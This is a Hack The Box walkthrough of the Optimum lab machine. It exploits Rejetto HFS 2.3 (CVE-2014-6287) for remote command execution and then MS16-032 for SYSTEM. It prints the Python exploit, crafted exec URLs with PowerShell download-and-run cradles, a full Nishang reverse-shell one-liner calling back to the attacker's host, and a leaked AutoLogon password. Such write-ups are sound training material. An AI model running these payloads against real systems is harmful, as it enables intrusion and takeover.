# Hack The Box - Optimum Walkthrough without Metasploit

## Reconnaissance
Retrieving the IP address of the machine, I started a quick inital Nmap scan to see which ports are open and which services are running on those ports.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Optimum]
└─$ sudo nmap -sC -sV -O -T4 -sT -oA nmap/initial 10.10.10.8                            
[sudo] password for darshan: 
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-30 07:00 EST
Nmap scan report for 10.10.10.8
Host is up (0.17s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2008|2016|7|Vista (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_7::-:professional cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2016 (85%), Microsoft Windows 7 Professional or Windows 8 (85%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (85%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 7 Professional (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.98 seconds
```

We get back the following result showing that 1 port is open:
- Port `80`: running `HttpFileServer httpd 2.3`.


Before starting enumeration, I ran a more comprehensive scan in the background to make sure that I did not miss anything.

So I ran `Rustscan` that covers all ports.
```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Optimum]
└─$ rustscan -a 10.10.10.8 --range 1-65535
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.8:80
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 80 10.10.10.8

Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-30 07:03 EST
Initiating Ping Scan at 07:03
Scanning 10.10.10.8 [2 ports]
Completed Ping Scan at 07:03, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:03
Completed Parallel DNS resolution of 1 host. at 07:03, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 07:03
Scanning 10.10.10.8 [1 port]
Discovered open port 80/tcp on 10.10.10.8
Completed Connect Scan at 07:03, 0.27s elapsed (1 total ports)
Nmap scan report for 10.10.10.8
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-01-30 07:03:47 EST for 0s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

## Enumeration
Now that only one port was open, I visited the web-page on port `80`, and found out a `HTTP File Server`. I found the `version` of the `HTS` on the web-page, and decided to google the version, to see if any vulnerability exists.

![opt-1](https://user-images.githubusercontent.com/87711310/215473802-b978760e-5e22-4bca-ba33-5ede91f24cf4.png)

I searched for `HTTPFileServer` on searchsploit, and it gave me a `RCE` exploit which was applicable on this machine.

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Optimum]
└─$ searchsploit httpfileserver
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Rejetto HttpFileServer 2.3.x - Remote Command | windows/webapps/49125.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

This vulnerability is know as [CVE-2014-6287](https://nvd.nist.gov/vuln/detail/CVE-2014-6287).

Now, I copied this exploit to my working directory and tried to understand how it works.

```python
#!/usr/bin/python3

# Usage :  python3 Exploit.py <RHOST> <Target RPORT> <Command>
# Example: python3 HttpFileServer_2.3.x_rce.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.4/shells/mini-reverse.ps1')"

import urllib3
import sys
import urllib.parse

try:
        http = urllib3.PoolManager()    
        url = f'http://{sys.argv[1]}:{sys.argv[2]}/?search=%00{{.+exec|{urllib.parse.quote(sys.argv[3])}.}}'
        print(url)
        response = http.request('GET', url)
        
except Exception as ex:
        print("Usage: python3 HttpFileServer_2.3.x_rce.py RHOST RPORT command")
        print(ex)
```

In Python, `{}` in a `f-string (notice the url is wrapped in f' ')` represent variables, so the `{{` and `}}` are how you escape to write actual curly brackets. So this is just a single HTTP request to `/?search={.+exec|[url-encoded command].}` to get `RCE`.

I started `Burp`, intercepted thre request, sent it to the `Repeater` and edited the URL to the following, to check it was actually exploitable.
```
http://10.10.10.8/?search=%00{.+exec|C%3A%5Cwindows%5Csystem32%5Ccmd.exe%20/c%20ping%2010.10.16.2.}
```
As a proof of concept, I crafted this URL to try to ping myself:
```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.16.2.}
```

f it works, I should see a single ICMP packet at my host. I started `tcpdump` and submitted, and nothing.

Often, this can be an issue with the system not finding the path to ping in this current environment. So I tried adding cmd `/c` before the command:
```
http://10.10.10.8/?search=%00{.+exec|cmd.exe+/c+ping+/n+1+10.10.16.2.}
```

It worked (interestingly four times):

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Optimum]
└─$ sudo tcpdump -i tun0 icmp and src 10.10.10.8
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:16:51.416240 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 117, length 40
16:16:51.416294 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 118, length 40
16:16:51.416309 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 119, length 40
16:16:51.418739 IP 10.10.10.8 > 10.10.14.10: ICMP echo request, id 1, seq 120, length 40
```

Now that I was able to get back the request, I decided to send a shell to the machine to get back a reverse shell on my machine. I grabed the PowerShell script from [Nishang](https://github.com/samratashok/nishang). I’ll copy the `Invoke-PowerShellTcpOneLine.ps1`, cut the comments, and update the IP and port:

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.2',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

I’ll save a copy of that as rev.ps1 (just to make an easier url I’m about to request). Then I’ll start a Python web server, and visit:

```
http://10.10.10.8/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.16.2/rev.ps1').}
```

When the file is returned, it is executed by `IEX`, short for `Invoke-Expression`, and the shell connects back to my listening `nc` (for some reason on this shell the prompt only shows up after the first command):

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Optimum]
└─$ nc -lvnp 9001    
listening on [any] 9001 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.8] 49166
whoami
optimum\kostas
PS C:\Users\kostas\Desktop> cat user.txt        
[REDACTED]
```

I was able to grab the user flag.

## Privilege Escalation
I started with [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) to look for escalation paths.

I hosted a python server and transferred winPEAS through it using the following command:
```
IEX(New-Object Net.WebClient).downloadstring('http://10.10.16.2/winPEAS.exe')
```

Scanning through the output, there were a few interesting things.

The box is `Windows Server 2012 R2`, and `64-bit:
```
    Hostname: optimum                               
    ProductName: Windows Server 2012 R2 Standard
    EditionID: ServerStandard                       
    ReleaseId:                                      
    BuildBranch:                                    
    CurrentMajorVersionNumber:                      
    CurrentVersion: 6.3                             
    Architecture: AMD64
```

There were creds for kostas:

```
  [+] Looking for AutoLogon credentials
    Some AutoLogon credentials were found!!
    DefaultUserName               :  kostas
    DefaultPassword               :  kdeEjDowkS*    

```
A bunch of services were called out as potentially interesting, but nothing in there really panned out.

Then, I decided to use `Sherlock`, which is a PowerShell script. I’ll download a copy, and see that it defines a bunch of functions, but doesn’t call any. I’ll add a line at the end to call `Find-AllVulns`. Then I’ll use a Python HTTP server to host a copy, and execute it the same way I got a shell:

```
...
            7601 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -lt 23584 ] }
            9600 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 18524 ] }
            10240 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 16384 ] }
            10586 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 19 ] }
            14393 { $VulnStatus = @("Not Vulnerable","Appears Vulnerable")[ $Revision -le 446 ] }
            default { $VulnStatus = "Not Vulnerable" }

        }

    Set-ExploitTable $MSBulletin $VulnStatus

}

Find-AllVulns

```

As you can see, at the very end of the `Sherlock.ps1` script, I've added `Find-AllVulns`.

```
...
Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Appears Vulnerable

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034?
VulnStatus : Appears Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Appears Vulnerable
...

```

There are three that show “Appears Vulnerable”, MS16-032, MS16-034, and MS16-135.

Since, when I ran `systeminfo` command on the device before, I knew it was a 64-bit architecture, but I still wanted to confirm it.

```
PS C:\Users\kostas\Desktop> [Environment]::Is64BitProcess
True
```

The exploit-db [link](https://www.exploit-db.com/exploits/39719/) will not work for this kind of scenario, as it will pop a new window on the box, rather than giving me the ability to run a command. Luckily, the folks in the Empire project ported a [version of this script](https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1) to add a command option.

I’ll download a copy of that, and add a line at the end to call it with a command to download and execute my reverse shell:\
```
Invoke-MS16032 -Command "iex(New-Object Net.WebClient).DownloadString('http://10.10.16.2/rev.ps1')"
```

From the 64-bit shell, (and with both a Python web server serving `rev.ps1` and `nc` listening on 443 to get the shell), I’ll use the same PowerShell cradle to download and execute the exploit:
```
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.10/Invoke-MS16032.ps1')
     __ __ ___ ___   ___     ___ ___ ___ 
    |  V  |  _|_  | |  _|___|   |_  |_  |
    |     |_  |_| |_| . |___| | |_  |  _|
    |_|_|_|___|_____|___|   |___|___|___|
                                        
                   [by b33f -> @FuzzySec]

[!] Holy handle leak Batman, we have a SYSTEM shell!!
```

There’s a request right away for `Invoke-MS16032.ps1`. Once that last message pops, there’s another request for `rev.ps1`, and then a shell at `nc`:

```
┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Windows-boxes/Optimum]
└─$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.8] 49244
whoami
nt authority\system
PS C:\Users\kostas\Desktop>
```

And I can grab `root.txt`:
```
PS C:\users\administrator\desktop> type root.txt
[REDACTED]
```
